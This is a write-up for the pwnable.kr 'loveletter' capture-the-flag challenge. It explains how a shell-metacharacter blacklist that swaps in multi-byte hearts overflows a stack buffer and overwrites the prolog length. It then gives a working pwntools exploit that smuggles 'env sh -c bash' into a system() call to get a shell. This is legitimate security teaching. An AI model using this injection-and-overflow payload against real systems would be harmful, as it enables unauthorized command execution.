# Pwnable.kr Loveletter CTF Writeup

## Problem Description

The code of the program is:

### main

```c
080493a5  int32_t main(int32_t argc, char** argv, char** envp)

080493ac      void* const __return_addr_1 = __return_addr
080493b4      int32_t* var_14 = &argc
080493cb      char** argv_1 = argv
080493d1      void* gsbase
080493d1      int32_t eax_1 = *(gsbase + 0x14)
080493ed      memset(&loveletter, 0, 0x100)
080493ff      size_t eax_3 = strlen(epilog)
08049414      size_t eax_5 = strlen(prolog)
08049429      printf(format: &data_804a021)
08049449      void buf
08049449      fgets(&buf, n: 0x100, fp: *stdin)
08049449      
08049470      if (*(&buf + strlen(&buf) - 1) == 0xa)
08049487          *(&buf + strlen(&buf) - 1) = 0
08049487      
08049499      puts(str: &data_804a03c)
080494ab      protect(&buf)
080494bd      size_t eax_12 = strlen(&buf)
080494d2      puts(str: &data_804a068)
080494fb      memcpy(&loveletter + zx.d(idx), prolog, eax_5)
08049511      idx += eax_5.w
08049539      memcpy(&loveletter + zx.d(idx), &buf, eax_12)
0804954f      idx += eax_12.w
08049577      memcpy(&loveletter + zx.d(idx), epilog, eax_3)
0804958d      idx += eax_3.w
0804959e      puts(str: &data_804a08c)
080495a6      gid_t egid = getegid()
080495b7      setregid(rgid: getegid(), egid)
080495c9      system(line: &loveletter)
080495d9      *(gsbase + 0x14)
080495d9      
080495e0      if (eax_1 == *(gsbase + 0x14))
080495f1          return 0
080495f1      
080495e2      __stack_chk_fail_local()
080495e2      noreturn
```

### protect

```c
08049216  int32_t protect(char* arg1)

08049235      void* gsbase
08049235      int32_t eax_1 = *(gsbase + 0x14)
08049240      int32_t var_127
08049240      __builtin_strncpy(dest: &var_127, src: "#&;`\'\"|*?~<>^()[]{}$\\,", n: 0x17)
08049240      
08049376      for (int32_t i = 0; strlen(arg1) u> i; i += 1)
08049350          for (int32_t j = 0; strlen(&var_127) u> j; j += 1)
080492c4              if (arg1[i] == *(j + &var_127))
080492e2                  void var_110
080492e2                  strcpy(&var_110, &arg1[i + 1])
080492f8                  *(arg1 + i) = 0xa599e2
08049308                  size_t eax_13 = strlen(&var_110)
08049337                  memcpy(&arg1[strlen(arg1)], &var_110, eax_13)
08049337      
08049397      if (eax_1 == *(gsbase + 0x14))
080493a4          return eax_1 - *(gsbase + 0x14)
080493a4      
08049399      __stack_chk_fail_local()
08049399      noreturn
```

When running, we see this:

```bash
loveletter@ubuntu:~$ ./loveletter
♥ My lover's name is : itamar
♥ Whatever happens, I'll protect her...
♥ Impress her upon my memory...
♥ Her name echoes in my mind...
I love itamar very much!
```

The program takes an input and replaces every character in the "blacklist" (which can cause command injection) with a heart. We need to get a shell and read the flag.

## Analysis

The first thing I noticed is a bug in the `protect()` function. The bug occurs when the program replaces a character with a heart but does not add a null terminator at the end. The issue is on this line:

`memcpy(&arg1[strlen(arg1)], &var_110, eax_13)`

It should be:

`memcpy(&arg1[strlen(arg1)], &var_110, eax_13 + 1)`

Additionally, each character is one byte, but the heart is three bytes. This means that replacing a character with a heart increases the input string's length by two bytes. We can see that the maximum length of the input is 0x100 (256 bytes), and it is located on the stack. This allows us to leverage the `protect()` function's behavior of extending the input buffer to perform a buffer overflow on the stack. Looking at the `main()` function, the stack layout is as follows:

```
eax_3 (epilog length) - 4 bytes
----------------------
eax_5 (prolog length) - 4 bytes
----------------------
buf[0x100]            - 256 bytes
```

My initial idea was to overflow `eax_5` (prolog length) with 0, so `loveletter` would start with my input, allowing me to call a shell using: `sh -c bash `. This way, the program would ignore the rest of the input (needed for the buffer overflow). By doing this, I could pass two arguments to `sh`: `bash` (to open a shell and read the flag) and the rest of the input, which `sh` would ignore.

However, there is a problem. There is no way to overflow `eax_5` with 0 because the input buffer increases by two bytes (and to set it to 0, it would need to increase by one byte). Additionally, I cannot write a 0 in the buffer because it would be treated as a null terminator and ignored.

Although I cannot overflow `eax_5` with 0, I can overflow it with any other number. After some thought, I realized I could use part of the prolog string (from its start) in my command. The issue is that my command (`sh -c bash `) starts with 's', while the prolog string starts with 'e'. Therefore, I needed a command that starts with 'e' and can take another command as an argument to execute it.

After some research, I found that `env` is perfect for this case. I can run: `env sh -c bash `, which will open a bash shell, allowing me to read the flag. To achieve this, I needed to set the prolog length to 1 and start my input with `nv sh -c bash`. When combined, this would execute `system("env sh -c bash AAAAAAAA...")`, opening a shell.

To overflow `eax_5` with 1, I needed to append the following to the input:

`...AAA + # + 0x01 + \0, 0x0c + 0x00 + 0x00 + 0x00` (the last four bytes represent the prolog length)

After the `protect()` function processes it, it will look like this:

`...AAA + a5 + 99 + e2, 0x01 + 0x00 + 0x00 + 0x00`

In conclusion, the input should look like this:

`nv sh -c bash AAAAAAA...#/x01`

## Exploit Code

```python
from pwn import *

context.log_level = 'info'

session = ssh(user='loveletter', host='pwnable.kr', port=2222, password='guest')
p = session.process(['nc', '0', '9034'])

payload = b"nv sh -c bash "
payload += b"A" * (253 - len(payload))
payload += b"#"
payload += b"\x01"

print(payload)

p.sendline(payload)
p.interactive() # cat flag
```
